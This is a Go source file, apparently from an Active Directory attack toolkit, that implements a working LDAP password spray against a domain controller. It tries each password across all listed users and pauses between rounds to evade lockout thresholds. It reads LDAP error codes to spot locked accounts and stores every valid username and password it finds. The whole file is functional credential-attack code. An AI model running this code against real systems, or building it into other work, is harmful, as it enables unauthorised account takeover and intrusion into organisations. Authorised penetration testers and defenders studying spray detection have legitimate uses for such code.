package password

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-ldap/ldap/v3"

	"github.com/MKlolbullen/AD-plower/internal/config"
	"github.com/MKlolbullen/AD-plower/internal/workspace"
)

// SprayOptions configures the spray: the DC we hit, the user and password
// lists, and the delay between rounds to stay under the lockout threshold.
type SprayOptions struct {
	DC            string
	Users         []string
	Passwords     []string
	UserFile      string
	PasswordFile  string
	DelayBetween  time.Duration
	StopOnSuccess bool
}

// SprayResult aggregates the outcome of a spray run.
type SprayResult struct {
	Found   []workspace.Cred `json:"found"`
	Tested  int              `json:"tested"`
	Locked  []string         `json:"locked"`
	Errors  map[string]string `json:"errors"`
}

// RunSpray iterates through passwords -> users (low-and-slow: one password
// across all users, then next password after a delay). Collected hits are
// saved to the workspace as valid credentials.
func RunSpray(opts SprayOptions) (*SprayResult, error) {
	users, err := mergeList(opts.Users, opts.UserFile)
	if err != nil {
		return nil, err
	}
	pwds, err := mergeList(opts.Passwords, opts.PasswordFile)
	if err != nil {
		return nil, err
	}
	if opts.DC == "" {
		return nil, fmt.Errorf("password spray: dc required")
	}
	if len(users) == 0 || len(pwds) == 0 {
		return nil, fmt.Errorf("password spray: empty user or password list")
	}

	res := &SprayResult{Errors: map[string]string{}}
	threads := config.Cfg.Threads
	if threads <= 0 {
		threads = 5
	}

	for _, pw := range pwds {
		sem := make(chan struct{}, threads)
		var wg sync.WaitGroup
		var mu sync.Mutex

		for _, u := range users {
			u, pw := u, pw
			sem <- struct{}{}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer func() { <-sem }()
				ok, locked, err := tryBind(opts.DC, u, pw)
				mu.Lock()
				defer mu.Unlock()
				res.Tested++
				switch {
				case ok:
					res.Found = append(res.Found, workspace.Cred{User: u, Password: pw, Source: "spray"})
				case locked:
					res.Locked = append(res.Locked, u)
				case err != nil:
					res.Errors[u+":"+pw] = err.Error()
				}
			}()
		}
		wg.Wait()
		if opts.StopOnSuccess && len(res.Found) > 0 {
			break
		}
		if opts.DelayBetween > 0 {
			time.Sleep(opts.DelayBetween)
		}
	}

	workspace.Patch(func(r *workspace.ReconResults) {
		r.ValidCreds = append(r.ValidCreds, res.Found...)
	})
	workspace.Save("spray", res)
	return res, nil
}

// tryBind performs a single authenticated LDAP bind. Distinguishes between
// "wrong password", "account locked/disabled" and transport errors so the
// caller can decide whether to continue.
func tryBind(dc, user, pw string) (ok, locked bool, err error) {
	conn, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", dc))
	if err != nil {
		return false, false, err
	}
	defer conn.Close()
	conn.SetTimeout(time.Duration(config.Cfg.TimeoutSecs) * time.Second)

	principal := user
	if !strings.Contains(user, "@") && !strings.Contains(user, "\\") && config.Cfg.Domain != "" {
		principal = user + "@" + config.Cfg.Domain
	}
	if err := conn.Bind(principal, pw); err != nil {
		msg := strings.ToLower(err.Error())
		switch {
		case strings.Contains(msg, "533"), strings.Contains(msg, "775"):
			return false, true, nil // disabled / locked
		case strings.Contains(msg, "invalid credentials"), strings.Contains(msg, "52e"):
			return false, false, nil
		default:
			return false, false, err
		}
	}
	return true, false, nil
}

func mergeList(inline []string, path string) ([]string, error) {
	out := append([]string(nil), inline...)
	if path == "" {
		return dedupe(out), nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	s.Buffer(make([]byte, 1<<20), 1<<20)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	return dedupe(out), s.Err()
}

func dedupe(in []string) []string {
	seen := make(map[string]struct{}, len(in))
	out := in[:0]
	for _, v := range in {
		if _, ok := seen[v]; ok {
			continue
		}
		seen[v] = struct{}{}
		out = append(out, v)
	}
	return out
}
